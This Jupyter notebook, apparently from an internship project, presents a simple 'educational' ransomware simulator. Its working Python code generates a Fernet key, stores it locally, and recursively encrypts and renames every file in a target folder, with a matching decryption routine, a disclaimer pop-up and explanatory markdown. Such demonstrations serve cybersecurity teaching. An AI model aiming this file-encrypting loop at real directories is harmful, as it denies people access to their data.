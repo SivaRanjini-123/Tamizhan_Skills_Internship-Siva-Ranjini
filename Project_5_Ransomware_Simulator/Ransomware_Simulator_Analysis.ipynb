{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "83472d88-c6ed-4d4b-8baa-321616b7caca",
   "metadata": {},
   "source": [
    "# Project 5: Simple Ransomware Simulator (Educational Use Only)\n",
    "\n",
    "# Problem Statement:\n",
    "Ransomware has emerged as a pervasive and devastating cybersecurity threat, fundamentally impacting individuals and organizations by encrypting critical data and demanding payment for its release. Understanding the technical mechanisms behind ransomware is crucial for developing effective defensive strategies and fostering cybersecurity awareness.\n",
    "\n",
    "# Objective:\n",
    "This project aims to build a simplified ransomware simulator. The core objective is to demonstrate the process of file encryption and subsequent decryption using a cryptographic key. This simulation is designed purely for **ethical, educational, and demonstrative purposes** to illustrate how such malicious software operates, without causing actual harm.\n",
    "\n",
    "# Technologies Utilized:\n",
    "* **Python:** The foundational programming language for the simulator.\n",
    "* **`cryptography` module (specifically `Fernet`):** A robust and secure cryptographic library in Python, providing symmetric encryption (the same key for encryption and decryption).\n",
    "* **`os` module:** For interacting with the operating system, particularly for navigating file directories and manipulating file paths.\n",
    "* **`tkinter` (Optional for GUI):** While the core will be CLI-based, `tkinter.messagebox` can be used for disclaimers or simple prompts.\n",
    "\n",
    "# Expected Outcome:\n",
    "A Python script that can:\n",
    "1.  Generate a unique encryption key.\n",
    "2.  Encrypt all files within a specified target folder (e.g., `test_files/`) using this key.\n",
    "3.  Append a custom extension (e.g., `.encrypted`) to the encrypted files.\n",
    "4.  Decrypt the encrypted files using the correct key, restoring them to their original state and removing the custom extension.\n",
    "5.  Include clear disclaimers about the ethical use of the tool."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c6abcbbf-b611-47db-bd75-4e0f7a9f92af",
   "metadata": {},
   "source": [
    "# Library Installation and Imports\n",
    "\n",
    "We need to ensure the `cryptography` library is installed. This library provides the `Fernet` symmetric encryption, which is strong and easy to use for this demonstration. After installation, we'll import all necessary modules."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "338ac73e-930e-4380-a0ec-32251ee82506",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: cryptography in c:\\anaconda3\\lib\\site-packages (43.0.0)\n",
      "Requirement already satisfied: cffi>=1.12 in c:\\anaconda3\\lib\\site-packages (from cryptography) (1.17.1)\n",
      "Requirement already satisfied: pycparser in c:\\anaconda3\\lib\\site-packages (from cffi>=1.12->cryptography) (2.21)\n",
      "Required libraries imported.\n",
      "Remember to have a 'test_files' folder with dummy files in the same directory.\n"
     ]
    }
   ],
   "source": [
    "!pip install cryptography\n",
    "\n",
    "import os\n",
    "from cryptography.fernet import Fernet\n",
    "from tkinter import messagebox # For the disclaimer pop-up\n",
    "\n",
    "print(\"Required libraries imported.\")\n",
    "print(\"Remember to have a 'test_files' folder with dummy files in the same directory.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aa012862-0e62-490c-8a62-1b2ac0fb23e8",
   "metadata": {},
   "source": [
    "# Key Generation and Storage\n",
    "\n",
    "Symmetric encryption requires a key that is used for both encryption and decryption. In a real ransomware scenario, this key would be securely sent to a remote server. For our simulation, we will generate a key and save it to a file (`key.key`). This file will be crucial for decrypting the files later.\n",
    "\n",
    "**Note:** In a real attack, this key would NOT be stored locally. Here, it's stored for demonstration purposes to allow decryption."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "acbe69b8-4152-4538-9c42-18718e3fdc1b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'key.key' already exists. Loading existing key.\n",
      "Fernet object initialized with the key.\n"
     ]
    }
   ],
   "source": [
    "def generate_key():\n",
    "    \"\"\"Generates a Fernet key and saves it to a file.\"\"\"\n",
    "    key = Fernet.generate_key()\n",
    "    with open(\"key.key\", \"wb\") as key_file:\n",
    "        key_file.write(key)\n",
    "    print(f\"Encryption key generated and saved to 'key.key'.\")\n",
    "    return key\n",
    "\n",
    "def load_key():\n",
    "    \"\"\"Loads the Fernet key from the 'key.key' file.\"\"\"\n",
    "    try:\n",
    "        return open(\"key.key\", \"rb\").read()\n",
    "    except FileNotFoundError:\n",
    "        print(\"[-] Error: 'key.key' not found. Please ensure the key has been generated.\")\n",
    "        return None\n",
    "\n",
    "# Generate a key if it doesn't exist, or load it\n",
    "if not os.path.exists(\"key.key\"):\n",
    "    encryption_key = generate_key()\n",
    "else:\n",
    "    print(\"'key.key' already exists. Loading existing key.\")\n",
    "    encryption_key = load_key()\n",
    "\n",
    "# Initialize Fernet object with the key\n",
    "if encryption_key:\n",
    "    f = Fernet(encryption_key)\n",
    "    print(\"Fernet object initialized with the key.\")\n",
    "else:\n",
    "    print(\"Could not initialize Fernet object. Key not available.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "87c3d847-d02a-4270-9dc2-5a6b83c5f17f",
   "metadata": {},
   "source": [
    "# File Encryption and Decryption Functions\n",
    "\n",
    "These functions handle the core logic of the ransomware simulator:\n",
    "* **`encrypt_file(file_path)`:** Reads the content of a file, encrypts it using the loaded `Fernet` key, overwrites the original file with the encrypted data, and appends a `.encrypted` extension.\n",
    "* **`decrypt_file(file_path)`:** Reads the encrypted content of a file, decrypts it using the same `Fernet` key, overwrites the encrypted file with the original data, and removes the `.encrypted` extension."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "fe7dacc9-b3e2-4bb1-ab4e-2f76605ec45f",
   "metadata": {},
   "outputs": [],
   "source": [
    "def encrypt_file(file_path):\n",
    "    \"\"\"Encrypts a single file using the global Fernet object 'f'.\"\"\"\n",
    "    try:\n",
    "        with open(file_path, \"rb\") as file:\n",
    "            original_data = file.read()\n",
    "        encrypted_data = f.encrypt(original_data)\n",
    "        with open(file_path, \"wb\") as file:\n",
    "            file.write(encrypted_data)\n",
    "        os.rename(file_path, file_path + \".encrypted\") # Add .encrypted extension\n",
    "        print(f\"[+] Encrypted: {file_path}\")\n",
    "    except Exception as e:\n",
    "        print(f\"[-] Error encrypting {file_path}: {e}\")\n",
    "\n",
    "def decrypt_file(file_path):\n",
    "    \"\"\"Decrypts a single file using the global Fernet object 'f'.\"\"\"\n",
    "    try:\n",
    "        with open(file_path, \"rb\") as file:\n",
    "            encrypted_data = file.read()\n",
    "        decrypted_data = f.decrypt(encrypted_data)\n",
    "        \n",
    "        # Remove the .encrypted extension\n",
    "        if file_path.endswith(\".encrypted\"):\n",
    "            original_file_path = file_path[:-len(\".encrypted\")]\n",
    "        else:\n",
    "            original_file_path = file_path # If no .encrypted, just use original path\n",
    "\n",
    "        with open(original_file_path, \"wb\") as file:\n",
    "            file.write(decrypted_data)\n",
    "        \n",
    "        # Remove the encrypted file if it was renamed\n",
    "        if file_path.endswith(\".encrypted\"):\n",
    "            os.remove(file_path) # Delete the .encrypted file\n",
    "        \n",
    "        print(f\"[+] Decrypted: {original_file_path}\")\n",
    "    except Exception as e:\n",
    "        print(f\"[-] Error decrypting {file_path}: {e}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "710afc2a-f248-448c-a16e-b1de9779ae3e",
   "metadata": {},
   "source": [
    "# Ransomware Simulation Logic\n",
    "\n",
    "This section contains the main logic to traverse the target directory (`test_files/`) and apply either encryption or decryption to the files.\n",
    "\n",
    "* **`TARGET_DIRECTORY`:** Specifies the folder containing the files to be processed. **ENSURE THIS IS YOUR `test_files` FOLDER!**\n",
    "* The script iterates through all files in the target directory.\n",
    "* Based on user choice, it calls either `encrypt_file` or `decrypt_file` for each file."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "aa7b161b-08cc-4edb-bca6-9941179a0784",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Define the target directory containing the files for simulation\n",
    "TARGET_DIRECTORY = \"test_files\" # Assumes 'test_files' is in the same directory as the notebook\n",
    "\n",
    "def run_simulation(mode):\n",
    "    \"\"\"\n",
    "    Runs the encryption or decryption simulation on files in the TARGET_DIRECTORY.\n",
    "    mode: 'encrypt' or 'decrypt'\n",
    "    \"\"\"\n",
    "    if not os.path.exists(TARGET_DIRECTORY):\n",
    "        print(f\"[-] Error: Target directory '{TARGET_DIRECTORY}' not found.\")\n",
    "        print(\"Please create a 'test_files' folder in the same directory as this notebook and put some dummy files in it.\")\n",
    "        return\n",
    "\n",
    "    print(f\"\\n--- Starting {mode.capitalize()}ion of files in '{TARGET_DIRECTORY}' ---\")\n",
    "    \n",
    "    files_processed = 0\n",
    "    for root, _, files in os.walk(TARGET_DIRECTORY):\n",
    "        for file in files:\n",
    "            file_path = os.path.join(root, file)\n",
    "            \n",
    "            # Avoid encrypting/decrypting the key itself or hidden files\n",
    "            if file == \"key.key\" or file.startswith('.'):\n",
    "                continue\n",
    "            \n",
    "            if mode == 'encrypt':\n",
    "                if not file.endswith(\".encrypted\"): # Only encrypt if not already encrypted\n",
    "                    encrypt_file(file_path)\n",
    "                    files_processed += 1\n",
    "            elif mode == 'decrypt':\n",
    "                if file.endswith(\".encrypted\"): # Only decrypt if it is encrypted\n",
    "                    decrypt_file(file_path)\n",
    "                    files_processed += 1\n",
    "            else:\n",
    "                print(\"Invalid mode. Use 'encrypt' or 'decrypt'.\")\n",
    "                return\n",
    "\n",
    "    print(f\"--- Finished {mode.capitalize()}ion. {files_processed} files processed. ---\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0680caf8-d605-4abf-b176-334529172d3f",
   "metadata": {},
   "source": [
    "# Main Execution and User Interaction\n",
    "\n",
    "This is the main block that controls the flow of the ransomware simulator.\n",
    "* It first displays an **important disclaimer** using a Tkinter message box. This step requires Tkinter, which is usually included with Python.\n",
    "* It then prompts the user to choose whether to `encrypt` or `decrypt` files.\n",
    "* It calls the `run_simulation` function based on the user's choice."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "e5ac1c01-af2c-4fdb-9896-e31bce129e36",
   "metadata": {},
   "outputs": [
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "Enter 'encrypt' to encrypt files or 'decrypt' to decrypt files:  decrypt\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "--- Starting Decryption of files in 'test_files' ---\n",
      "[+] Decrypted: test_files\\dummy1.txt\n",
      "[+] Decrypted: test_files\\dummy2.txt\n",
      "[+] Decrypted: test_files\\.ipynb_checkpoints\\dummy1-checkpoint.txt\n",
      "[+] Decrypted: test_files\\.ipynb_checkpoints\\dummy2-checkpoint.txt\n",
      "[+] Decrypted: test_files\\.ipynb_checkpoints\\untitled-checkpoint.txt\n",
      "--- Finished Decryption. 5 files processed. ---\n",
      "\n",
      "Simulation complete.\n"
     ]
    }
   ],
   "source": [
    "def show_disclaimer():\n",
    "    \"\"\"Displays a critical disclaimer message box.\"\"\"\n",
    "    messagebox.showwarning(\n",
    "        \"CRITICAL DISCLAIMER: Educational Use Only\",\n",
    "        \"This program is a SIMULATOR for EDUCATIONAL PURPOSES ONLY.\\n\\n\"\n",
    "        \"DO NOT use this on any real, important files or systems.\\n\"\n",
    "        \"ALWAYS use dummy files in a designated 'test_files' folder.\\n\"\n",
    "        \"Unauthorized use is illegal and unethical.\"\n",
    "    )\n",
    "\n",
    "# Show the disclaimer before proceeding\n",
    "show_disclaimer()\n",
    "\n",
    "# Get user input for action\n",
    "user_action = input(\"Enter 'encrypt' to encrypt files or 'decrypt' to decrypt files: \").lower()\n",
    "\n",
    "if user_action == 'encrypt':\n",
    "    run_simulation('encrypt')\n",
    "elif user_action == 'decrypt':\n",
    "    run_simulation('decrypt')\n",
    "else:\n",
    "    print(\"Invalid action. Please enter 'encrypt' or 'decrypt'.\")\n",
    "\n",
    "print(\"\\nSimulation complete.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "da2c4b2d-7155-4915-aa4a-68641e2a7bef",
   "metadata": {},
   "source": [
    "# Conceptual Output / Simulation Results\n",
    "\n",
    "The simulation involves two main stages: encryption and decryption. Both stages are confirmed by console output and by observing the changes in the `test_files` directory.\n",
    "\n",
    "# Disclaimer Pop-up:\n",
    "Upon running the main execution cell, a critical disclaimer is displayed via a pop-up window to ensure the user understands the educational nature and potential risks of the simulation.\n",
    "\n",
    "![Ransomware Disclaimer Pop-up](ransomware_disclaimer_popup.png)\n",
    "\n",
    "# Encryption Phase:\n",
    "When the 'encrypt' option is chosen, the script iterates through the files in the `test_files` directory, encrypting each one and appending the `.encrypted` extension.\n",
    "**File System View After Encryption:**\n",
    "After encryption, the files in `test_files` directory will have the `.encrypted` extension.\n",
    "\n",
    "![Files Encrypted Screenshot](files_encrypted_screenshot.png)\n",
    "\n",
    "# Decryption Phase:\n",
    "When the 'decrypt' option is chosen (after files have been encrypted), the script reads the encrypted files, decrypts them, and restores their original names by removing the `.encrypted` extension.\n",
    "\n",
    "**File System View After Decryption:**\n",
    "After decryption, the files in `test_files` directory will revert to their original names and content.\n",
    "\n",
    "![Files Decrypted Screenshot](files_decrypted_screenshot.png)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "6ed22633-8ffe-40e0-8b97-28cfd1575142",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'test_files' folder exists.\n",
      "Files found in 'test_files':\n",
      "  - dummy1.txt (Size: 149 bytes)\n",
      "  - dummy2.txt (Size: 123 bytes)\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "\n",
    "target_dir = \"test_files\"\n",
    "\n",
    "if os.path.exists(target_dir):\n",
    "    print(f\"'{target_dir}' folder exists.\")\n",
    "\n",
    "    files_in_test_dir = [f for f in os.listdir(target_dir) if os.path.isfile(os.path.join(target_dir, f))]\n",
    "\n",
    "    if files_in_test_dir:\n",
    "        print(f\"Files found in '{target_dir}':\")\n",
    "        for file_name in files_in_test_dir:\n",
    "            file_path = os.path.join(target_dir, file_name)\n",
    "            file_size = os.path.getsize(file_path)\n",
    "            print(f\"  - {file_name} (Size: {file_size} bytes)\")\n",
    "    else:\n",
    "        print(f\"'{target_dir}' folder is empty or contains only subdirectories.\")\n",
    "else:\n",
    "    print(f\"Error: '{target_dir}' folder does NOT exist at {os.getcwd()}\\\\{target_dir}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a2392204-259b-4d42-8df9-cc9ee98bf25e",
   "metadata": {},
   "source": [
    "# Conclusion - Project 5: Simple Ransomware Simulator\n",
    "\n",
    "This project successfully developed a simple yet illustrative ransomware simulator using Python and the `cryptography` module. By demonstrating the processes of key generation, file encryption, and subsequent decryption, the project provides a practical insight into the fundamental mechanisms employed by real-world ransomware. The emphasis on using dummy files and a clear ethical disclaimer highlights the critical importance of responsible and educational use of such powerful tools. This simulation serves as an effective educational demo, fostering greater awareness of cybersecurity threats and the significance of strong data protection measures."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d1dc9ea8-108a-4631-b47f-2b9b93681c46",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
